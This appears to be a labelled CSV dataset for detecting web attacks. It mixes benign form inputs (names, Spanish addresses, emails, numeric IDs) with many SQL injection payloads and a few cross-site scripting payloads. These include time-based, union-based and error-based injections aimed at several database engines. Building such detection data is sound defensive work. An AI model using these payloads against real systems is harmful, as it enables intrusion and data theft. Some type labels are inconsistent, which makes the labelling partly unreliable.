Text,attack_type,Label,type
coxcojita,norm,0,normal
"1')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('vwxg'='vwxg",sqli,1,sql
70679983v,norm,0,normal
merrywea,norm,0,normal
1 where 6223=6223 rlike sleep(5)#,sqli,1,normal
"-9541) as bnky where 3934=3934 union all select 3934,3934,3934#",sqli,1,sql
"1') procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ('knhm'='knhm",sqli,1,normal
el-am,norm,0,normal
"-2116%'))) union all select 7119,7119,7119,7119,7119--",sqli,1,sql
40352,norm,0,normal
soeltoft@nanogenerador.pr,norm,0,normal
garaioa,norm,0,normal
"1') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('lmoh' like 'lmoh",sqli,1,sql
"1"" union all select null,null#",sqli,1,sql
djola@placeresadultos.kp,norm,0,normal
1')));if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
1')) as stnn where 6160=6160 and 8881=7347--,sqli,1,sql
0577598147350952,norm,0,normal
"-5606)) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
cenicero,norm,0,normal
cristie,norm,0,normal
"comandante barja 84,",norm,0,normal
ba1uetazo,norm,0,normal
52948186r,norm,0,normal
victorico,norm,0,normal
1' where 5103=5103;select case when 7717=7717 then 1 else null end--,sqli,1,sql
cervantes,norm,0,normal
"-9136') or make_set(9354=9354,7185)",sqli,1,normal
tabaquera,norm,0,normal
mordi3nt-e,norm,0,normal
1) as obzn where 7652=7652 or (select * from (select(sleep(5)))ydpu)--,sqli,1,sql
"1"") where 2088=2088 union all select null,null,null,null--",sqli,1,sql
-6500')) or (8459=8459)*4906 and (('padu' like 'padu,sqli,1,normal
hotta,norm,0,normal
"1"") as advz where 5166=5166 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
-8513' union all select 7414--,sqli,1,sql
"1%""))) and (3502=7893)*7893 and (((""%""=""",sqli,1,normal
45183,norm,0,normal
3997o9a02,norm,0,normal
albornoz quiva,norm,0,normal
schauer,norm,0,normal
1'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('jzpb'='jzpb,sqli,1,sql
luciano nagel,norm,0,normal
bergere@canovash.bb,norm,0,normal
infante juan manuel s/n 5?a,norm,0,normal
"calle la merce, 120",norm,0,normal
"1' and 8407=(select count(*) from generate_series(1,5000000)) and 'mnbg' like 'mnbg",sqli,1,sql
francino llosa,norm,0,normal
"1')) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
8721,norm,0,normal
larsson.dorio@ankawaelda.it,norm,0,normal
7106,norm,0,normal
2u17z0o,norm,0,normal
su9ltamente,norm,0,normal
beland,norm,0,normal
1'+(select 'upmd' where 3438=3438;begin dbms_lock.sleep(5); end--,sqli,1,sql
fulgencio,norm,0,normal
despault2,norm,0,normal
"1%"") order by 1--",sqli,1,sql
3728906567349968,norm,0,normal
74677553a,norm,0,normal
"1""))) rlike (select * from (select(sleep(5)))vwyq)#",sqli,1,sql
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",sqli,1,sql
vall de ebo,norm,0,normal
1)) as syot where 1199=1199;waitfor delay '0:0:5'--,sqli,1,sql
61605523t,norm,0,normal
"calle bergueda 5, 5?d",norm,0,normal
fisas,norm,0,normal
1) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'),sqli,1,sql
"-1844') union all select 9572,9572,9572,9572#",sqli,1,sql
"1""))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (((""wile"" like ""wile",sqli,1,normal
"1"")));begin user_lock.sleep(5); end and (((""memh"" like ""memh",sqli,1,sql
1')) and 6969=(select 6969 from pg_sleep(5)) and (('gjja'='gjja,sqli,1,sql
"1')(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ('yqmv'='yqmv",sqli,1,sql
dasie,norm,0,normal
argerich tries,norm,0,normal
42148,norm,0,normal
7986,norm,0,normal
"-5826"")) union all select 7192,7192#",sqli,1,sql
plza. santa maria 96 8?f,norm,0,normal
cesana@lasexta-f1.jm,norm,0,normal
e0l4i1,norm,0,normal
horalek,norm,0,normal
"-4453'))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('boxt'='boxt",sqli,1,sql
2752106671698345,norm,0,normal
"calle aluders, 96",norm,0,normal
"1')) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (('dgwe' like 'dgwe",sqli,1,sql
"1)) as fwru where 5262=5262 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
4641290123831700,norm,0,normal
ceajo,norm,0,normal
bose,norm,0,normal
1);select (case when (3626=6022) then 3626 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
40146763x,norm,0,normal
"1'))) union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
roseman-hensley@fighting-machines.wf,norm,0,normal
9136,norm,0,normal
52137467d,norm,0,normal
camita,norm,0,normal
"arco, el",norm,0,normal
castellser,norm,0,normal
18339,norm,0,normal
luxford_baumann@lasiestacreativa.tel,norm,0,normal
40389675l,norm,0,normal
1') or 6793=(select 6793 from pg_sleep(5)),sqli,1,sql
"plaza hernan cortes 199, 4f",norm,0,normal
33775,norm,0,normal
"-5385"" union all select 4577,4577,4577,4577,4577,4577,4577#",sqli,1,sql
46177,norm,0,normal
56346174s,norm,0,normal
9004541540453342,norm,0,normal
kofoed@serviconlevante.mr,norm,0,normal
1' where 4473=4473 and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
05217,norm,0,normal
"1"";select (case when (3855=3855) then 3855 else 1/(select 0) end)--",sqli,1,sql
hofmeist0,norm,0,normal
"1'+(select gajr where 6653=6653 union all select null,null,null,null#",sqli,1,sql
8731298131217571,norm,0,normal
c/ badaia 10 10-h,norm,0,normal
"1"") and (4085=4885)*4885 and (""sxte""=""sxte",sqli,1,normal
46225556h,norm,0,normal
"-4373%"")) or 5672=5188--",sqli,1,sql
"1"") as xwnu where 6490=6490 union all select null,null,null,null,null,null--",sqli,1,sql
dudas@google-movil.np,norm,0,normal
1'+(select wpbj where 1849=1849;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
zuk,norm,0,normal
"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",sqli,1,sql
2561,norm,0,normal
fadlalla,norm,0,normal
"-5170')) as ovbf where 4833=4833 union all select 4833,4833,4833,4833--",sqli,1,sql
"1"") where 1392=1392 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",sqli,1,sql
"av. vicente mortes, 78, 8?f",norm,0,normal
1%'))) or (select * from (select(sleep(5)))ydpu) and ((('%'=',sqli,1,sql
92283149l,norm,0,normal
rittenho,norm,0,normal
"1') as hwpf where 5603=5603;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
"1 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)",sqli,1,sql
shepperd,norm,0,normal
camueso,norm,0,normal
"isabelita ruiz, 31",norm,0,normal
52361693p,norm,0,normal
3959,norm,0,normal
5696,norm,0,normal
"1""));select count(*) from generate_series(1,5000000) and ((""dros""=""dros",sqli,1,sql
-6109 union all select 6784--,sqli,1,sql
villatios@cpanelweb.ie,norm,0,normal
21613516w,norm,0,normal
42773884w,norm,0,normal
talarrubias,norm,0,normal
1'+(select 'uetb' where 6468=6468;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
ward@fortelingenieria.si,norm,0,normal
2226226735734653,norm,0,normal
"1""))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (((""tiet"" like ""tiet",sqli,1,sql
4789967077221120,norm,0,normal
berg@esposo.com.ve,norm,0,normal
aterrado*r,norm,0,normal
"jardines, 110",norm,0,normal
31482726g,norm,0,normal
calle cesareo martinez 87 7?a,norm,0,normal
"1%' or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
"1%'))) and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
algu chavarri,norm,0,normal
1'+(select gkve where 1943=1943 waitfor delay '0:0:5')+',sqli,1,sql
"passatge credit, 93, 13-c",norm,0,normal
fluvia,norm,0,normal
1%' and 1736=4220,sqli,1,normal
7694435206249147,norm,0,normal
-2055) or 3038=3038,sqli,1,normal
8030e,norm,0,normal
"1"") as wjdc where 8694=8694 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",sqli,1,sql
"1' in boolean mode) or elt(6272=6272,sleep(5))#",sqli,1,normal
04270,norm,0,normal
"1%"")));select pg_sleep(5)--",sqli,1,sql
"-2296"" union all select 7359,7359,7359,7359,7359,7359#",sqli,1,sql
muelas del pan,norm,0,normal
1;select case when 2599=7035 then 1 else null end--,sqli,1,sql
50371,norm,0,normal
"1"") where 5065=5065;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
cossio obrist,norm,0,normal
"1';select count(*) from generate_series(1,5000000)",sqli,1,sql
zael,norm,0,normal
1'||(select 'ubza' where 2576=2576;select (case when (4341=7041) then 4341 else 4341*(select 4341 from mysql.db) end)#,sqli,1,sql
92309128p,norm,0,normal
l1b6855ca30e,norm,0,normal
03t86i3,norm,0,normal
alegre nomdedeu,norm,0,normal
prevost_toby@ballobar.com.ad,norm,0,normal
07807880r,norm,0,normal
cuperley@7peines.gu,norm,0,normal
dunlap-leaud@videospornocaseros.ye,norm,0,normal
aranceta alameda,norm,0,normal
patrstica,norm,0,normal
"(select 2*(if((select * from (select concat(0x7171706a71,(select (elt(6130=6130,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",sqli,1,sql
cotizada,norm,0,normal
mellor,norm,0,normal
1' where 1153=1153 or (select * from (select(sleep(5)))ydpu)--,sqli,1,sql
"1%'))) or elt(5873=5873,sleep(5))#",sqli,1,normal
extinti3o,norm,0,normal
villamediana de iregua,norm,0,normal
shiley,norm,0,normal
"c/ juan rabadan 27, 6?a",norm,0,normal
asperillo,norm,0,normal
louise,norm,0,normal
-1587') or 8339=5540,sqli,1,normal
12220649j,norm,0,normal
65119692e,norm,0,normal
"1%""));select (case when (6047=8897) then 6047 else 6047*(select 6047 from information_schema.character_sets) end)#",sqli,1,sql
"1"") and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""ajuh""=""ajuh",sqli,1,sql
"-9596) where 3425=3425 union all select 3425,3425,3425,3425,3425,3425#",sqli,1,sql
1' where 5455=5455 and sleep(5)--,sqli,1,sql
keep_theberge9@aprendeaestudiar.gr,norm,0,normal
"-2222' in boolean mode) union all select 7649,7649,7649,7649,7649,7649,7649,7649--",sqli,1,sql
"1;call regexp_substring(repeat(right(char(3702),0),500000000),null)-- vhmc",sqli,1,sql
mcnear.trotta@lettere.ve,norm,0,normal
1%' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and '%'=',sqli,1,sql
"-5360' where 8178=8178 union all select 8178,8178,8178--",sqli,1,sql
"1""));begin user_lock.sleep(5); end and ((""cxoi""=""cxoi",sqli,1,sql
dotan,norm,0,normal
armes@muchacha.com.lr,norm,0,normal
gascons mol,norm,0,normal
-7710' where 5658=5658 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,1,sql
pompilio,norm,0,normal
1) where 9446=9446 union all select null#,sqli,1,sql
"1%')));iif(5257=5257,1,1/0)",sqli,1,sql
3orc75r,norm,0,normal
maheu,norm,0,normal
"1')) and make_set(8245=9872,9872) and (('kzgt'='kzgt",sqli,1,normal
"1' in boolean mode);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
dax-branson@indianabilljaen.kp,norm,0,normal
22167302v,norm,0,normal
"1""))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((""uwdz""=""uwdz",sqli,1,sql
5856365245432307,norm,0,normal
55912738z,norm,0,normal
"-3270%' or elt(9404=3498,3498) and '%'='",sqli,1,normal
crcova valentini,norm,0,normal
7192,norm,0,normal
"1') as rqzz where 4987=4987 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,1,sql
calle laujar 42,norm,0,normal
ambas,norm,0,normal
camprodon,norm,0,normal
1 where 2382=2382;(select * from (select(sleep(5)))acdk)#,sqli,1,sql
1;select (case when (7254=5901) then 1 else 7254*(select 7254 from master..sysdatabases) end)--,sqli,1,sql
"-4223'))) union all select 7913,7913,7913,7913,7913,7913,7913,7913,7913,7913#",sqli,1,sql
4330235428458719,norm,0,normal
1));select pg_sleep(5)--,sqli,1,sql
muir,norm,0,normal
lotera,norm,0,normal
medici-bousen@youtubeanunciox.mm,norm,0,normal
7784,norm,0,normal
"calle sobrerroca 96, 7?f",norm,0,normal
just darns,norm,0,normal
1%') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('%'=',sqli,1,sql
"-3370"") union all select 7845,7845,7845,7845,7845,7845#",sqli,1,sql
komai@ofertachina.ir,norm,0,normal
"1'||(select 'ussi' where 8958=8958;select benchmark(5000000,md5(0x4c4d6142)))||'",sqli,1,sql
lundigan@3horas.gob,norm,0,normal
"1'+(select snam where 1993=1993;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
"""<script>alert('xssya')</script>",xss,2,xss
c?idiana,norm,0,normal
buc_falo,norm,0,normal
c6ch3n,norm,0,normal
"-4541"")) or make_set(4821=5233,5233) and ((""xfex""=""xfex",sqli,1,normal
48450,norm,0,normal
"1') as lrif where 6525=6525 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",sqli,1,sql
falconi@socimi.com.dd,norm,0,normal
conejo mota,norm,0,normal
"1 and elt(1210=1210,sleep(5))# macc",sqli,1,normal
-9217 or 9323=9323#,sqli,1,normal
"1'||(select 'fbsr' where 7899=7899 and elt(4249=4249,7259))||'",sqli,1,sql
1'))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((('vtoi' like 'vtoi,sqli,1,sql
"1"")) as duny where 3756=3756 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
65340567m,norm,0,normal
"-8888%') union all select 5312,5312,5312,5312,5312,5312,5312,5312--",sqli,1,sql
"1%'))) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"1"" or 8421=(select count(*) from generate_series(1,5000000))",sqli,1,sql
camarillo guillen,norm,0,normal
tronchuda,norm,0,normal
28782647x,norm,0,normal
"1')) as icik where 1440=1440 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
florestano,norm,0,normal
12510,norm,0,normal
1' where 3900=3900 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1,sql
"-7940%"") union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#",sqli,1,sql
"calle escultor ramon barba, 153 3-a",norm,0,normal
2876,norm,0,normal
2304,norm,0,normal
61218401z,norm,0,normal
79274775p,norm,0,normal
43061609c,norm,0,normal
"1') as ssxj where 3845=3845 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
"entrada casa llop, 56,",norm,0,normal
49714,norm,0,normal
"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",sqli,1,sql
"1'||(select 'dujx' where 6896=6896 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
aricel,norm,0,normal
-2820')) or 6679=8848--,sqli,1,sql
"-5857%"")) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""%""=""",sqli,1,sql
lerch@piaceredelivery.mr,norm,0,normal
"1) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)",sqli,1,sql
4815643958728547,norm,0,normal
"1'+(select 'bmit' where 3716=3716 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))+'",sqli,1,sql
"1') where 7887=7887 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",sqli,1,sql
1%') rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ('%'=',sqli,1,sql
auleda sez,norm,0,normal
"-1755%' union all select 2615,2615,2615,2615,2615,2615#",sqli,1,sql
szeto,norm,0,normal
7634,norm,0,normal
-3431%') or 9323=9323#,sqli,1,normal
"-1<layer src=""javascript:document.cookie=true;""></layer>",xss,2,xss
navas de jorquera,norm,0,normal
decidir,norm,0,normal
"1 where 9898=9898 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
"1"") and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""dppw"" like ""dppw",sqli,1,sql
poca urzagaste,norm,0,normal
"-9583')) union all select 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",sqli,1,sql
"pont de bar, el",norm,0,normal
1437589782727245,norm,0,normal
demetre,norm,0,normal
"-6924') union all select 2046,2046,2046,2046,2046,2046,2046--",sqli,1,sql
2930629510541352,norm,0,normal
"1"" where 2365=2365 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
1) where 4600=4600 or sleep(5)--,sqli,1,sql
villagalijo,norm,0,normal
"1"" and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""jgcv""=""jgcv",sqli,1,sql
37159,norm,0,normal
"1 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"1%"") or 8466=benchmark(5000000,md5(0x694a4745)) and (""%""=""",sqli,1,normal
"1);select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual",sqli,1,sql
"1')))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((('nets' like 'nets",sqli,1,sql
nihei_donat@multaspendientes.cu,norm,0,normal
-4262%'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('%'=',sqli,1,sql
67718883y,norm,0,normal
"1%"";iif(1878=2513,1,1/0)",sqli,1,sql
stinton@sms24h.dk,norm,0,normal
"1"")) or 8421=(select count(*) from generate_series(1,5000000)) and ((""ubxw"" like ""ubxw",sqli,1,sql
calle alferez gonzalez moro 120 11-e,norm,0,normal
karl,norm,0,normal
"1"";select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""ejmj"" like ""ejmj",sqli,1,sql
corpa,norm,0,normal
d50allecido,norm,0,normal
emdid5,norm,0,normal
dikaitis5,norm,0,normal
11696227z,norm,0,normal
1%');select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
"1') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('jvll' like 'jvll",sqli,1,sql
lacoste,norm,0,normal
"1%"")) and (select * from (select(sleep(5)))gcrr)#",sqli,1,sql
"-5320 where 8051=8051 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
21880,norm,0,normal
3494,norm,0,normal
cristy,norm,0,normal
96305711l,norm,0,normal
natalio,norm,0,normal
"calle marsella s/n,",norm,0,normal
"c/ cal correu, 0,",norm,0,normal
"-7202%"")) union all select 2901#",sqli,1,sql
porter,norm,0,normal
"-8319"")) or 7878=5970 and ((""jcaz"" like ""jcaz",sqli,1,normal
meggy,norm,0,normal
"c/ naturopata diego prieto 58,",norm,0,normal
bogarde4@tiendasyofertas.museum,norm,0,normal
-4191) order by 1#,sqli,1,normal
"1') as wtfo where 5666=5666 union all select null,null,null,null--",sqli,1,sql
bellew@frioelectric.no,norm,0,normal
12460,norm,0,normal
"1' where 4701=4701 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",sqli,1,sql
4336085166451274,norm,0,normal
forsyne@velaconsultores.mx,norm,0,normal
"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#",sqli,1,sql
darill,norm,0,normal
maitena,norm,0,normal
"1"")) order by 1#",sqli,1,normal
"calle castillo de luna 199, 4c",norm,0,normal
borriol,norm,0,normal
1421,norm,0,normal
8o881si9le,norm,0,normal
stacey@mediacar.la,norm,0,normal
choong,norm,0,normal
zack,norm,0,normal
1%');select pg_sleep(5) and ('%'=',sqli,1,sql
-1908'))) union all select 7665#,sqli,1,sql
"<script>alert(""xssya"")</script>",xss,2,xss
"1')) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('igqm'='igqm",sqli,1,sql
"1""));select (case when (8208=7960) then 8208 else 8208*(select 8208 from information_schema.character_sets) end)#",sqli,1,sql
"1')) union all select null,null,null,null,null,null#",sqli,1,sql
"-2325'))) union all select 1442,1442,1442--",sqli,1,sql
de_la,norm,0,normal
"1) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)",sqli,1,normal
25214,norm,0,normal
manumiti6,norm,0,normal
8653,norm,0,normal
"-4822"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""owbp""=""owbp",sqli,1,sql
"1"" where 3329=3329 or sleep(5)--",sqli,1,sql
aloin,norm,0,normal
"1'||(select 'dukt' where 3206=3206 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))||'",sqli,1,sql
"el halcon 154, 8?f",norm,0,normal
jaye,norm,0,normal
quicena,norm,0,normal
vairavan,norm,0,normal
"1') where 8211=8211 union all select null,null,null,null,null#",sqli,1,sql
haroldo,norm,0,normal
"-1<img src=""livescript:document.cookie=true;"">",xss,2,sql
0379584529465876,norm,0,normal
alcolea,norm,0,normal
or5i6or6i686,norm,0,normal
turtuno@touringa.hu,norm,0,normal
nichol,norm,0,normal
gourley,norm,0,normal
1%';select case when 4656=3716 then 1 else null end--,sqli,1,sql
1442431887503330,norm,0,normal
"<img lowid=xss src=""javascript:alert('xss')"">",xss,2,xss
3274173205988985,norm,0,normal
4371,norm,0,normal
-2569' union all select 4484--,sqli,1,sql
brcena de pie de concha,norm,0,normal
97co38225s9,norm,0,normal
4ub16ns8rv0do5,norm,0,normal
03603247k,norm,0,normal
"1'+(select myci where 8903=8903;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
carceln,norm,0,normal
28108650m,norm,0,normal
"1' and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
cambrils,norm,0,normal
"1 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))# couj",sqli,1,sql
"-5211"")) as bkvr where 4082=4082 or 2323=8052",sqli,1,normal
-8463))) or 4861=9834#,sqli,1,normal
polop,norm,0,normal
"1 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",sqli,1,sql
"calle barrio villayuda 169,",norm,0,normal
"-5779) union all select 6089,6089--",sqli,1,sql
"1"");select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",sqli,1,sql
"travesia barrionuevo, 49",norm,0,normal
5856,norm,0,normal
clerc,norm,0,normal
"1 where 4968=4968 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",sqli,1,sql
reto8sivo,norm,0,normal
vila-sana,norm,0,normal
mcgovern-boxter@buscadordevideos.ag,norm,0,normal
1'))) rlike (select * from (select(sleep(5)))sgvo) and ((('uzmy' like 'uzmy,sqli,1,sql
"-8976%""))) union all select 5146,5146,5146,5146,5146,5146,5146,5146--",sqli,1,sql
2528,norm,0,normal
17590r,norm,0,normal
jawdokimov@manzanilladevillafafila.np,norm,0,normal
railey@g-audio.ic,norm,0,normal
rhetta,norm,0,normal
alfafara,norm,0,normal
d0s9pi2car,norm,0,normal
"villanueva de cauche 169,",norm,0,normal
baril,norm,0,normal
"-1512 union all select 9013,9013,9013,9013#",sqli,1,sql
kappa,norm,0,normal
